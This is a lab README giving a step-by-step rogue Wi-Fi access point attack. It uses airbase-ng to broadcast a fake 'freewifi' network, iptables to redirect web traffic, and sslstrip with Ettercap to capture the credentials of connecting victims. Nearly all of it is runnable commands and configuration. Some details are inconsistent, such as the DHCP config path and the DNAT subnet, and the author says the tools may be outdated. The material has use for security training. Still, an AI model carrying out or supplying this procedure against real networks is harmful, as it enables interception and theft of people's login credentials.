# Rogue Access Point Attack
_For Educational Purposes Only_
## Attack High Level Overview:
1. Victim connects to fake AP.
2. Victim connects to the internet via the fake AP.
3. Using sslstrip and Ettercap to capture credentials.
4. The fake AP forwards the victim to the legitimate website.

## How to Create the Attack:
1. Setup adapter and bridge network.
2. Create a DHCP server and configure settings.
3. Using airmon-ng to monitor network.
4. Use airbase-ng to start your rogue access point.
5. Modify airbase tunnel to gain internet connection.
6. Start sslstrip and Ettercap.

### Task 0 – Setup Adapter and Bridge Network
Connect the wireless adapter to your device and make sure to bridge your internet to the adapter.  
**VM Network Setting:** Bridged (autodetect)

**Troubleshooting Alfa AWUS036NHA in Windows 10/11**  
Download this link to be used as manual driver:  
[Alfa AWUS036NHA Driver](https://rokland.com/mask/drivers/awus036nha/Alfa-AWUS036NHA-Win10.zip)

### Task 1 – Create DHCP Server and Configure Settings
Make note of your gateway IP and the adapter interface.

![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/e0c7dd18-a2e8-48e6-8c22-721726840139)

![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/9b7dd808-7d3e-4ba9-9ca3-38d45f6874c3)

Run the command below to install the DHCP server package, which was formerly known as dhcp3-server:
```bash
sudo apt install isc-dhcp-server
```
Now, open and modify the main configuration file, define your DHCP server options:
```bash
sudo vi /etc/dhcp/dhcpd.conf
```

Make the following changes:

    authoritative;
    default-lease-time 600;
    max-lease-time 7200;
    subnet 192.168.1.0 netmask 255.255.255.0 {
      option routers 192.168.1.1;
      option subnet-mask 255.255.255.0;
      option domain-name 'wifiname';
      option domain-name-server 192.168.1.1;
      range 192.168.1.2 192.168.1.40;
    }

![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/155343da-b965-49fe-be41-ef8562e35e28)

### Task 2 – Using airmon-ng to Monitor Network
```bash 
sudo airmon-ng
```
![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/3cbe6c92-f446-4922-bd6c-b05b2fc8f49b)

```bash 
sudo airmon-ng start <interface>
```
![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/3f272a6a-2ad8-4d5c-befa-497ea1edae2e)

### Task 3 – Use airbase-ng to Start Your Rogue Access Point

```bash 
sudo airbase-ng -c 11 -e freewifi <mon interface>
```
![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/a185f47a-4f74-4063-a78d-04a3f9ee078e)

![image](https://github.com/alduralmknoon/Rouge-Access-Point-Attack-Lab/assets/27437815/2583ea9d-7e7f-4cc5-947a-ea5ec33227d1)

Now that we have our AP up and running, we will make some changes to the tunnel interface created by airbase-ng.

**Keep the airbase-ng terminal running and continue the following tasks in new terminals.**

Run the following commands in a new terminal:
```bash
ifconfig at0 192.168.1.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
/etc/init.d/isc-dhcp-server start
```

**What’s happening here?**  
In the second command, we are adjusting the maximum transmission unit (MTU), which allows our AP to transfer larger packets and thus prevent any packet fragmentation due to low transmission units available. Then, we are adding a routing table. Next, we create IP forwarding to ensure the AP clients have internet connections. We do that by adding IP forwarding rules. We start by echoing into the `ip_forward` file and then write all the rules as illustrated in the commands.  
_The highlighted value is the gateway address for our host machine._  
Finally, we start our DHCP server.  
**You will need to be root or use sudo to run all commands.**

### Task 4 – Start sslstrip and Ettercap

Run the following commands:
```bash
sslstrip -f -p -k 10000
```
_Keep this terminal open and open another terminal for Ettercap._

In the new terminal, run the following command to start Ettercap:
```bash
ettercap -p -u -T -q -i at0
```

_Keep this terminal open._

### Task 5 – Start Capturing Credentials

You will see the victim's activity and credentials on the Ettercap terminal.

To view what sslstrip captured, run:
```bash
cat sslstrip.log
```

_Note:_ sslstrip and ettercap commands might be outdated. 


## Resources:
[Install DHCP Server in Ubuntu/Debian](https://www.tecmint.com/install-dhcp-server-in-ubuntu-debian/)
[YouTube Video on Creating Rogue AP](https://www.youtube.com/watch?v=HePt2J4uSno&list=LL&index=1&t=644s&pp=gAQBiAQB8AUB)
